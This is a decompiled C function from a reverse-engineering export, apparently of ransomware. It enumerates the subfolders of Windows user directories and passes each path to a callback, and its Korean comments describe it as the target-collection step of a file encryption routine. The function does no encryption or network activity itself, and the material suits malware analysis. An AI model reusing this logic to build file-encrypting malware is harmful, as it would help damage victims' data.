// --- Metadata ---
// Function Name: ScanUserDirs_10004A40
// Address: 0x10004A40
// Exported At: 20250522_120646
// Signature: unknown_signature
// ---------------
int __cdecl ScanUserDirs_10004A40(int csidl, int a2, int a3)
{
  const wchar_t *v3; // esi
  int result; // eax
  const wchar_t *v5; // ebx
  wchar_t *v6; // eax
  HANDLE hFindFile; // [esp+18h] [ebp-86Ch]
  WCHAR pszPath; // [esp+1Ch] [ebp-868h] BYREF
  wchar_t v9[259]; // [esp+1Eh] [ebp-866h] BYREF
  wchar_t Buffer; // [esp+224h] [ebp-660h] BYREF
  char v11[516]; // [esp+226h] [ebp-65Eh] BYREF
  __int16 v12; // [esp+42Ah] [ebp-45Ah]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+42Ch] [ebp-458h] BYREF
  WCHAR String; // [esp+67Ch] [ebp-208h] BYREF
  char v15[516]; // [esp+67Eh] [ebp-206h] BYREF
  __int16 v16; // [esp+882h] [ebp-2h]

  pszPath = word_1000D918;
  String = word_1000D918;
  memset(v9, 0, 0x204u);
  v9[258] = 0;
  memset(v15, 0, sizeof(v15));
  v16 = 0;
  v3 = 0;
  SHGetFolderPathW(0, csidl, 0, 0, &pszPath);   // Windows의 특수 폴더를 탐색하여 특정 하위 디렉터리 구조를 기반으로 콜백 함수를 호출  
  if ( wcslen(&pszPath) < 4 )
    return 0;
  result = (int)wcsrchr(&pszPath, 0x5Cu);       // 파일 암호화 루틴에서 특정 폴더 안에 있는 대상 위치를 수집하고 처리 
  if ( result )
  {
    *(_WORD *)result = 0;
    v5 = (const wchar_t *)(result + 2);
    result = (int)wcschr(&v9[2], 0x5Cu);
    if ( result )
    {
      *(_WORD *)result = 0;
      if ( csidl == 46 )
      {
        SHGetFolderPathW(0, 5, 0, 0, &String);
        if ( wcslen(&String) >= 4 )
        {
          v6 = wcsrchr(&String, 0x5Cu);
          v3 = v6;
          if ( v6 )
          {
            *v6 = 0;
            v3 = v6 + 1;
          }
        }
      }
      Buffer = word_1000D918;
      memset(v11, 0, sizeof(v11));
      v12 = 0;
      swprintf(&Buffer, (const size_t)L"%s\\*.*", &pszPath);
      hFindFile = FindFirstFileW(&Buffer, &FindFileData);
      if ( hFindFile == (HANDLE)-1 )
      {
        result = 0;
      }
      else
      {
        do
        {
          if ( wcscmp(FindFileData.cFileName, L".") )
          {
            if ( wcscmp(FindFileData.cFileName, L"..") )
            {
              if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
              {
                swprintf(&Buffer, (const size_t)L"%s\\%s\\%s", &pszPath, FindFileData.cFileName, v5);
                ((void (__stdcall *)(wchar_t *, WCHAR *, int))a2)(&Buffer, FindFileData.cFileName, a3);
                if ( v3 )
                {
                  if ( wcscmp(v5, v3) )
                  {
                    swprintf(&Buffer, (const size_t)L"%s\\%s\\%s", &pszPath, FindFileData.cFileName, v3);
                    ((void (__stdcall *)(wchar_t *, WCHAR *, int))a2)(&Buffer, FindFileData.cFileName, a3);
                  }
                }
              }
            }
          }
        }
        while ( FindNextFileW(hFindFile, &FindFileData) );
        FindClose(hFindFile);
        result = 1;
      }
    }
  }
  return result;
}
